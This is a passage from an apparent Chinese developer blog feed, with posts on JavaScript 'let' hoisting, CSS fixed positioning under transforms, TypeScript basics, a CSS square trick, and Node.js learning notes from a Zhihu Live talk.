        <content type="html"><![CDATA[<p>#let到底有没有变量提升？<br>我在 StackOverflow 上闲逛的时候，无意中发现了一个是关于「let 到底有没有提升」的问题：</p><p><a href="http://link.zhihu.com/?target=https://stackoverflow.com/questions/31219420/are-variables-declared-with-let-or-const-not-hoisted-in-es6">Are variables declared with let or const not hoisted in ES6?</a></p><p>其中一个高票回答认为 <a href="http://link.zhihu.com/?target=https://stackoverflow.com/a/31222689/1262580">JS 中所有的声明（var&#x2F;let&#x2F;const&#x2F;function&#x2F;class），都存在提升</a>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="string">&#x27;global&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(x) <span class="comment">// Uncaught ReferenceError: x is not defined</span></span><br><span class="line">  <span class="comment">// why not global？</span></span><br><span class="line">  <span class="keyword">let</span> x = <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原因有两个</p><ol><li>console.log(x) 中的 x 指的是下面的 x，而不是全局的 x</li><li>执行 log 时 x 还没「初始化」，所以不能使用（也就是所谓的暂时死区）</li></ol><p>看到这里，你应该明白了 let 到底有没有提升：</p><ul><li>let 的「创建」过程被提升了，但是初始化没有提升。</li><li>var 的「创建」和「初始化」都被提升了。</li><li>function 的「创建」「初始化」和「赋值」都被提升了。</li></ul><p>我们再来看一个例子~</p><p><img src="/Blog/2018/12/03/zch's_fool/JS%E5%8F%88%E4%B8%80%E5%85%B3%E4%BA%8Elet%E8%B6%A3%E9%97%BB/index/img.png" alt="let"></p><p>这个问题说明：如果 let x 的初始化过程失败了，那么</p><ul><li>x 变量就将永远处于 created 状态。</li><li>你无法再次对 x 进行初始化（初始化只有一次机会，而那次机会你失败了）。</li><li>由于 x 无法被初始化，所以 x 永远处在暂时死区（也就是盗梦空间里的 limbo）！</li><li>有人会觉得 JS 坑，怎么能出现这种情况；其实问题不大，因为此时代码已经报错了，后面的代码想执行也没机会。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 趣闻 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTML关于定位趣闻</title>
      <link href="/Blog/2018/12/02/zch&#39;s_fool/HTML%E5%85%B3%E4%BA%8E%E5%AE%9A%E4%BD%8D%E8%B6%A3%E9%97%BB/index/"/>
      <url>/Blog/2018/12/02/zch&#39;s_fool/HTML%E5%85%B3%E4%BA%8E%E5%AE%9A%E4%BD%8D%E8%B6%A3%E9%97%BB/index/</url>
      
        <content type="html"><![CDATA[<p>大家都知道 <code>position: fixed</code> 是相对于视口（<code>viewport</code>）定位的。</p><p>但是这个「真理」会受另一个元素的影响……对，我知道你很震惊……</p><p>先看正常情况：</p><p><img src="/Blog/2018/12/02/zch's_fool/HTML%E5%85%B3%E4%BA%8E%E5%AE%9A%E4%BD%8D%E8%B6%A3%E9%97%BB/index/img.png"></p><p>网页右边是一个 <code>iframe</code>，红色的 .<code>fixed</code> 元素相对于 <code>iframe</code> 视口左上角定位，与我们预期一致。</p><p>接下来我在 <code>.box</code> 上面加一个 CSS3 中的属性，就会改变你的认知：</p><p><img src="/Blog/2018/12/02/zch's_fool/HTML%E5%85%B3%E4%BA%8E%E5%AE%9A%E4%BD%8D%E8%B6%A3%E9%97%BB/index/img_1.png"></p><p>父容器加了 <code>transform</code> 之后，<code>fixed</code> 定位的元素居然相对于父容器定位。</p><p>天知道以后 <code>CSS</code> 会不会加更多元素来影响我已经认为是真理的事情？</p><p>我说一个更实际的问题吧，你敢在接手一个项目时，在任意一个元素上加 <code>transform</code> 属性吗？</p><p>你不敢！除非你把它的每个子元素的属性都检查一遍……确定没有 <code>fixed</code> 定位。</p>]]></content>
      
      
      <categories>
          
          <category> 趣闻 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript学习记录</title>
      <link href="/Blog/2018/11/30/typescript/TypeScript%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index/"/>
      <url>/Blog/2018/11/30/typescript/TypeScript%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index/</url>
      
        <content type="html"><![CDATA[<h2 id="接口-interface"><a href="#接口-interface" class="headerlink" title="接口-interface"></a>接口-interface</h2><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">interface <span class="title">Person</span> &#123;</span><br><span class="line">  <span class="attribute">firstName</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attribute">lastNmae</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">greeter</span>(<span class="params">person: Person</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Hello&#x27;</span>+person.firstName+person.lastName)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> user = &#123;<span class="attribute">firstName</span>: <span class="string">&#x27;zhang&#x27;</span>, <span class="attribute">lastName</span>: <span class="string">&#x27;super&#x27;</span>&#125;;</span><br><span class="line">greeter(user);</span><br></pre></td></tr></table></figure><p><code>person: Person</code>参数必须符合interface的定义才会被允许。</p><h2 id="Public"><a href="#Public" class="headerlink" title="Public"></a>Public</h2><p>为了简化重复申明赋值的属性</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">  <span class="attr">fullName</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">firstName</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">lastName</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">firstName, lastName</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">firstName</span> = firstName;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">lastName</span> = lastName;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 因为使用public以上可以等价于以下</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">  <span class="attr">fullName</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> firstName, <span class="keyword">public</span> lastName</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">fullName</span>: firstName + lastName</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类-class"><a href="#类-class" class="headerlink" title="类-class"></a>类-class</h2><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">  <span class="attr">fullName</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> firstName, <span class="keyword">public</span>  lastName</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">fullName</span>: firstName + lastName</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">firstName</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">lastName</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">greeter</span>(<span class="params">person: Person</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello&#x27;</span>+person.<span class="property">firstName</span>+person.<span class="property">lastName</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> user = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&#x27;zhang&#x27;</span>, <span class="string">&#x27;super&#x27;</span>);</span><br><span class="line"><span class="title function_">greeter</span>(user);</span><br></pre></td></tr></table></figure><h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><p>实现参数多个类型和函数返回值</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a: <span class="built_in">string</span>, b: <span class="built_in">string</span></span>): <span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span></span>): <span class="built_in">number</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a: <span class="built_in">any</span>, b: <span class="built_in">any</span></span>): <span class="built_in">any</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>规定了a为number组成的数组</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span></span> <span class="keyword">select</span>(a: <span class="keyword">number</span>[]): <span class="keyword">number</span>&#123; // 或者<span class="function"><span class="keyword">function</span></span> <span class="keyword">select</span>(a: Array&lt;<span class="keyword">number</span>&gt;): <span class="keyword">number</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a[<span class="number">0</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="元祖"><a href="#元祖" class="headerlink" title="元祖"></a>元祖</h2><p>表示已知一个元素的数量和类型的<code>数组</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let x:[string, number];</span><br><span class="line">x = [<span class="string">&#x27;我是string&#x27;</span>, <span class="number">1</span>]; <span class="regexp">//</span> ok</span><br><span class="line">x = [<span class="number">1</span>, <span class="string">&#x27;我是string&#x27;</span>]; <span class="regexp">//</span> error</span><br><span class="line">x = [<span class="number">1</span>, <span class="string">&#x27;我是string&#x27;</span>, <span class="string">&#x27;我还是一个string&#x27;</span>]; <span class="regexp">//</span> error</span><br></pre></td></tr></table></figure><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>定义一些带名字的常量</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">enum Gender&#123;</span><br><span class="line">  male,</span><br><span class="line">  female</span><br><span class="line">&#125;</span><br><span class="line">interface Person &#123;</span><br><span class="line">  sex: Genter;</span><br><span class="line">&#125;</span><br><span class="line">function <span class="built_in">show</span>( a: Person)&#123;</span><br><span class="line">  console<span class="selector-class">.log</span>(&#x27;我是：&#x27;+a.sex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">show</span>(&#123;sex: Gender.male&#125;) <span class="comment">// ok</span></span><br><span class="line"><span class="built_in">show</span>(&#123;sex: Gender.female&#125;) <span class="comment">// ok</span></span><br><span class="line"><span class="built_in">show</span>(&#123;sex: Gender.hahamale&#125;) <span class="comment">// error</span></span><br><span class="line"><span class="built_in">show</span>(&#123;sex: Gender.<span class="number">11122</span>&#125;) <span class="comment">// error</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一行代码实现一个1:1自适应的正方形</title>
      <link href="/Blog/2018/11/30/zch&#39;s_fool/%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA1%E6%AF%941%E8%87%AA%E9%80%82%E5%BA%94%E7%9A%84%E6%AD%A3%E6%96%B9%E5%BD%A2/index/"/>
      <url>/Blog/2018/11/30/zch&#39;s_fool/%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA1%E6%AF%941%E8%87%AA%E9%80%82%E5%BA%94%E7%9A%84%E6%AD%A3%E6%96%B9%E5%BD%A2/index/</url>
      
        <content type="html"><![CDATA[<h5 id="偶然发现一个有趣的现象，一行css代码即可迅速实现一个1：1自适应的正方形。"><a href="#偶然发现一个有趣的现象，一行css代码即可迅速实现一个1：1自适应的正方形。" class="headerlink" title="偶然发现一个有趣的现象，一行css代码即可迅速实现一个1：1自适应的正方形。"></a>偶然发现一个有趣的现象，一行css代码即可迅速实现一个1：1自适应的正方形。</h5><p><em><strong>先来看一看效果图</strong></em><br>amazing！</p><p><img src="/Blog/2018/11/30/zch's_fool/%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA1%E6%AF%941%E8%87%AA%E9%80%82%E5%BA%94%E7%9A%84%E6%AD%A3%E6%96%B9%E5%BD%A2/index/img.gif" alt="1:1自适应正方形"></p><p>思考~~~<br><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br>揭秘 ^ _ ^</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#c03</span>;</span><br><span class="line">  <span class="attribute">padding-top</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="http://js.jirengu.com/gahik/2/edit">浏览地址</a></p>]]></content>
      
      
      <categories>
          
          <category> 趣闻 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>知乎Live---node</title>
      <link href="/Blog/2018/11/29/node_js/%E7%9F%A5%E4%B9%8ELive---node/index/"/>
      <url>/Blog/2018/11/29/node_js/%E7%9F%A5%E4%B9%8ELive---node/index/</url>
      
        <content type="html"><![CDATA[<h3 id="安装Node-js环境-3m安装法"><a href="#安装Node-js环境-3m安装法" class="headerlink" title="安装Node.js环境 3m安装法"></a>安装Node.js环境 3m安装法</h3><ul><li>nvm（node version manager）【需要使用npm安装，替代品是yrm（支持yarn）】</li><li>nrm（node registry manager）【需要使用npm安装，替代品是yrm（支持yarn）】</li><li>npm（node packages manager）【内置，替代品是n或nvs（对win也支持）】</li></ul><h3 id="常用软件"><a href="#常用软件" class="headerlink" title="常用软件"></a>常用软件</h3><ul><li>1）oh my zsh是我最习惯的shell，终端下非常好用 配合iterm2分屏 + spectacle全屏，几乎无敌</li><li>2）brew是mac装软件非常好的方式，和apt-get、rpm等都非常类似 安装4个必备软件 - brew install git 最流行的SCM源码版本控制软件 - brew install wget 下载、扒站神器 - brew install ack 搜索代码神器 - brew install autojump 终端下多目录跳转神器</li><li>3）vim 我虽然不算vim党，但也深爱着。janus是一个非常好用的vim集成开发环境。比如ctrl-p、nerdtree等插件都集成了，对我这种懒人足够了。</li></ul><p>自己 Mac + Node.js 电脑初始化开发环境的安装脚本 <a href="https://github.com/i5ting/i5ting-mac-init">https://github.com/i5ting/i5ting-mac-init</a></p><p>值得一学，我推荐VSCode编辑器！</p><p>更多调试方法，参见<a href="https://github.com/i5ting/node-debug-tutorial">https://github.com/i5ting/node-debug-tutorial</a></p><p><img src="/Blog/2018/11/29/node_js/%E7%9F%A5%E4%B9%8ELive---node/index/img.png" alt="Node.js 使用场景主要分为4大类"></p><ul><li>1）跨平台：覆盖你能想到的面向用户的所有平台，传统的PC Web端，以及PC客户端 <code>nw.js/electron</code> 、移动端 <code>cordova</code>、HTML5、<code>react-native</code>、<code>weex</code>，硬件 <code>ruff.io</code> 等</li><li>2）Web应用开发：网站、Api、RPC服务等</li><li>3）前端：三大框架 React \ <code>Vue</code> \ <code>Angular</code> 辅助开发，以及工程化演进过程（使用<code>Gulp</code> &#x2F;Webpack 构建 Web 开发工具）</li><li>4）工具：<code>npm</code>上各种工具模块，包括各种前端预编译、构建工具 <code>Grunt</code> &#x2F; <code>Gulp</code>、脚手架，命令行工具，各种奇技淫巧等</li></ul><p>Node.js 应用场景非常丰富，比如 Node.js 可以开发操作系统，但一般我都不讲的，就算说了也没多大意义，难道大家真的会用吗？一般，我习惯将 Node.js 应用场景氛围7个部分。</p><p>1）初衷，server端，不想成了前端开发的基础设施<br>2）命令行辅助工具，甚至可以是运维<br>3）移动端：cordova，pc端：nw.js和electron<br>4）组件化，构建，代理<br>5）架构，前后端分离、api proxy<br>6）性能优化、反爬虫与爬虫<br>7) 全栈最便捷之路</p><p>a）Error-first Callback<br>定义错误优先的回调写法只需要注意2条规则即可：</p><ul><li>回调函数的第一个参数返回的error对象，如果error发生了，它会作为第一个err参数返回，如果没有，一般做法是返回null。</li><li>回调函数的第二个参数返回的是任何成功响应的结果数据。如果结果正常，没有error发生，err会被设置为null，并在第二个参数就出返回成功结果数据。</li></ul><p>下面让我们看一下调用函数示例，Node.js 文档里最常采用下面这样的回调方式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>(<span class="params">err, res</span>) &#123;</span><br><span class="line">  <span class="comment">// process the error and result</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 <code>callback</code> 指的是带有2个参数的函数：”err”和 “res”。语义上讲，非空的“err”相当于程序异常；而空的“err”相当于可以正常返回结果“res”，无任何异常。</p><p>b）EventEmitter</p><p>事件模块是 Node.js 内置的对观察者模式“发布&#x2F;订阅”（publish&#x2F;subscribe）的实现，通过<code>EventEmitter</code>属性，提供了一个构造函数。该构造函数的实例具有 <code>on</code> 方法，可以用来监听指定事件，并触发回调函数。任意对象都可以发布指定事件，被 <code>EventEmitter</code> 实例的 <code>on</code> 方法监听到。</p><p>在node 6之后，可以直接使用<code>require(&#39;events&#39;)</code>类</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">EventEmitter</span> = <span class="built_in">require</span>(<span class="string">&#x27;events&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">MyEmitter</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">util.<span class="title function_">inherits</span>(<span class="title class_">MyEmitter</span>, <span class="title class_">EventEmitter</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> myEmitter = <span class="keyword">new</span> <span class="title class_">MyEmitter</span>();</span><br><span class="line"></span><br><span class="line">myEmitter.<span class="title function_">on</span>(<span class="string">&#x27;event&#x27;</span>, <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, <span class="variable language_">this</span>);</span><br><span class="line">    <span class="comment">// Prints: a b &#123;&#125;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">myEmitter.<span class="title function_">emit</span>(<span class="string">&#x27;event&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>);</span><br></pre></td></tr></table></figure><p>和jquery、vue里的Event是非常类似的。而且前端自己也有EventEmitter。</p><p>c）如何更好的查Node.js文档 API是应用程序接口Application Programming Interface的简称。从Node.js异步原理，我们可以知道，核心在于 Node.js SDK 中API调用，然后交由EventLoop（Libuv）去执行，所以我们一定要熟悉Node.js的API操作。 Node.js的API都是异步的，同步的函数是奢求，要查API文档，在高并发场景下慎用。 笔者推荐使用 <a href="%5Bhttps://kapeli.com/dash%5D(https://kapeli.com/dash)">Dash</a> 或 <a href="%5Bhttps://zealdocs.org/%5D(https://zealdocs.org/)">Zeal</a> 查看离线文档，经常查看离线文档，对Api理解会深入很多，比IDE辅助要好，可以有效避免离开IDE就不会写代码的窘境。</p><p>Bluebird是 Node.js 世界里性能最好的Promise&#x2F;a+规范的实现模块，Api非常齐全，功能强大，是原生Promise外的不二选择。</p><p>好处如下：</p><ul><li>避免Node.js内置Promise实现 问题，使用与所有版本兼容</li><li>避免Node.js 4曾经出现的内存泄露问题</li><li>内置更多扩展，timeout、 promisifyAll等，对Promise&#x2F;A+规范提供了强有力的补充<br>限于时间关系，这里就不一一列举了，还是那句话，在学习Node.js过程中，对于Promise了解多深入都不过分。 推荐学习资料 - Node.js最新技术栈之Promise篇 <a href="https://cnodejs.org/topic/560dbc826a1ed28204a1e7de">https://cnodejs.org/topic/560dbc826a1ed28204a1e7de</a> - 理解 Promise 的工作原理 <a href="https://cnodejs.org/topic/569c8226adf526da2aeb23fd">https://cnodejs.org/topic/569c8226adf526da2aeb23fd</a> - Promise 迷你书 <a href="http://liubin.github.io/promises-book/">http://liubin.github.io/promises-book/</a></li></ul><p>小结</p><p>这部分共讲了4个小点，都是极其直接的必须掌握的知识点。</p><ul><li><ol><li>异步流程控制学习重点</li></ol></li><li>2）Api写法：Error-first Callback 和 EventEmitter</li><li>3）中流砥柱：Promise</li><li>4）终极解决方案：Async&#x2F;Await</li></ul><hr><p>这里再提一下关于Node.js源码阅读问题，很多人api都还没完熟练就去阅读源码，这是非常不赞成的，不带着问题去读源码是比较容易迷失在大量代码中的。效果并不好。</p><p>先用明白，然后再去阅读Node.js源码，然后探寻libuv并发机制。很多人买了朴大的《深入浅出Node.js》一书，看了之后还是不太会用，不是书写的不好，而是步骤不对。</p><ul><li>Node in action和了不起的Node.js是入门的绝好书籍，非常简单，各个部分都讲了，但不深入，看了之后，基本就能用起来了</li><li>当你用了一段之后，你会对Node.js的运行机制好奇，为啥呢？这时候去读朴大的《深入浅出Node.js》一书就能够解惑。原因很简单，九浅一深一书是偏向底层实现原理的书，从操作系统，并发原理，node源码层层解读。如果是新手读，难免会比较郁闷。</li><li>实践类的可以看看雷宗民（老雷）和赵坤（nswbmw）写的书</li></ul><p>我一般给大家的推荐是把Node in action读上5遍10遍，入门干活足够了。剩下的就是反复实践，多写代码和npm模块就好。</p><h3 id="Web编程要点"><a href="#Web编程要点" class="headerlink" title="Web编程要点"></a>Web编程要点</h3><p>一般，后端开发指的是 Web 应用开发中和视图渲染无关的部分，主要是和数据库交互为主的重业务型逻辑处理。但现在架构升级后，Node.js 承担了前后端分离重任之后，有了更多玩法。从带视图的<strong>传统Web应用</strong>和<strong>面向Api接口应用</strong>，到通过 RPC 调用封装对数据库的操作，到提供前端 Api 代理和网关，服务组装等，统称为<strong>后端开发</strong>，不再是以往只有和数据库打交道的部分才算后端。这样，就可以让前端工程师对开发过程可控，更好的进行调优和性能优化。</p><p>对 Node.js 来说，一直没有在后端取得其合理的占有率，原因是多方面的，暂列几条。</p><ul><li>1）利益分配，已有实现大多是Java或者其他语言，基本是没法撼动的，重写的成本是巨大的，另外，如果用Node写了，那么那些写Java的人怎么办？抢人饭碗，这是要拼命的。</li><li>2）Node相对年轻，大家对Node的理解不够，回调和异步流程控制略麻烦，很多架构师都不愿意花时间去学习。尽管在Web应用部分处理起来非常简单高效，但在遇到问题时并不容易排查定位，对开发者水平要求略高。</li><li>3）开发者技能单一，很多是从前端转过来的，对数据库，架构方面知识欠缺，对系统设计也知之不多，这是很危险的，有种麻杆打狼两头害怕的感觉。</li><li>4）Node在科普、培训、布道等方面做的并不好，国外使用的非常多，国内却很少人知道，不如某些语言做得好。</li></ul><p>尽管如此，Node.js 还是尽人皆知，卷入各种是非风口，也算是在大前端浪潮中大红大紫。原因它的定位非常明确，补足以 JavaScript 为核心的全栈体系中服务器部分。开发也是人，能够同时掌握并精通多门语言的人毕竟不多，而且程序员的美德是“懒”，能使用 JavaScript 一门语言完成所有事儿，为什么要学更多呢？</p><p>我们可以根据框架的特性进行分类</p><table><thead><tr><th>框架名称</th><th>特性</th><th>点评</th></tr></thead><tbody><tr><td>Express</td><td>简单、实用，路由中间件等五脏俱全</td><td>最著名的Web框架</td></tr><tr><td>Derby.js &amp;&amp; Meteor</td><td>同构</td><td>前后端都放到一起，模糊了开发便捷，看上去更简单，实际上上对开发来说要求更高</td></tr><tr><td>Sails、Total</td><td>面向其他语言，Ruby、PHP等</td><td>借鉴业界优秀实现，也是 Node.js 成熟的一个标志</td></tr><tr><td>MEAN.js</td><td>面向架构</td><td>类似于脚手架，又期望同构，结果只是蹭了热点</td></tr><tr><td>Hapi和Restfy</td><td>面向Api &amp;&amp; 微服务</td><td>移动互联网时代Api的作用被放大，故而独立分类。尤其是对于微服务开发更是利器</td></tr><tr><td>ThinkJS</td><td>面向新特性</td><td>借鉴ThinkPHP，并慢慢走出自己的一条路，对于Async函数等新特性支持，无出其右，新版v3.0是基于Koa v2.0的作为内核的</td></tr><tr><td>Koa</td><td>专注于异步流程改进</td><td>下一代Web框架</td></tr><tr><td>Egg</td><td>基于Koa，在开发上有极大便利</td><td>企业级Web开发框架</td></tr></tbody></table><p>Web编程核心</p><ul><li>异步流程控制（前面讲过了）</li><li>基本框架 Koa或Express，新手推荐Express，毕竟资料多，上手更容易。如果有一定经验，推荐Koa，其实这些都是为了了解Web编程原理，尤其是中间件机制理解。</li><li>数据库 mongodb或mysql都行，mongoose和Sequelize、bookshelf，TypeOrm等都非常不错。对于事物，不是Node.js的锅，是你选的数据库的问题。另外一些偏门，想node连sqlserver等估计还不成熟，我是不会这样用的。</li><li>模板引擎， ejs，jade，nunjucks。理解原理最好。尤其是extend，include等高级用法，理解布局，复用的好处。其实前后端思路都是一样的。</li></ul><p>1、计算机基础薄弱该如何完善自己的知识体系？</p><p>答:追逐长尾，所见所闻不懂的都去学就好啦。我是这样过来的，头几年每天14个小时+，很累，不过效果还可以。os，算法，数据结构，设计模式，编译原理，基本也就这些重点。做到每天都有进步就好，别贪多求快。数学和英文当然也是越狠越好的！</p><p>3、如何系统的学习node？ 答:阶段 1&#x2F;要会用，能完成工作任务 2&#x2F;写点提高效率的工具 3&#x2F;参与开源项目，甚至是node源码 应对方法 1&#x2F;《node in action》看五遍，然后就去写吧，别管代码质量如何，能写敢写 2&#x2F;多用些模块，理解它们，如果有机会就自己写一下，万一有很多人用你，我小弟写过一个地区选择加载的json数据，star数不少呢 3&#x2F;给别人贡献代码，要去学别人的习惯，网上有git标准工作流和提pr方法，你要做的是精研该模块代码，关注issue，其他就是等机会。另外朴灵的深入浅出多读几遍，试着读node源码，你的理解会更好。推荐看看我写的《通过开源项目去学习》<a href="https://github.com/i5ting/Study-For-StuQ">https://github.com/i5ting/Study-For-StuQ</a> 4&#x2F;跳出node范围，重新审视node的应用场景，对未来你的技术选项和决策大有裨益</p><p>关于 Node 的书几乎都过时了，我该买哪本？</p><p>答：<br>1）Node in action和了不起的Node.js是入门的绝好书籍，非常简单，各个部分都讲了，但不深入，看了之后，基本就能用起来了<br>2）当你用了一段之后，你会对Node.js的运行机制好奇，为啥呢？这时候去读朴大的《深入浅出Node.js》一书就能够解惑。原因很简单，九浅一深一书是偏向底层实现原理的书，从操作系统，并发原理，node源码层层解读。如果是新手读，难免会比较郁闷。<br>3)实践类的可以看看雷宗民（老雷）和赵坤（nswbmw）写的书</p><p>如果你不着急，也可以等我的那本《更了不起的Node.js》，预计明年3月之后。</p><p>Node Web 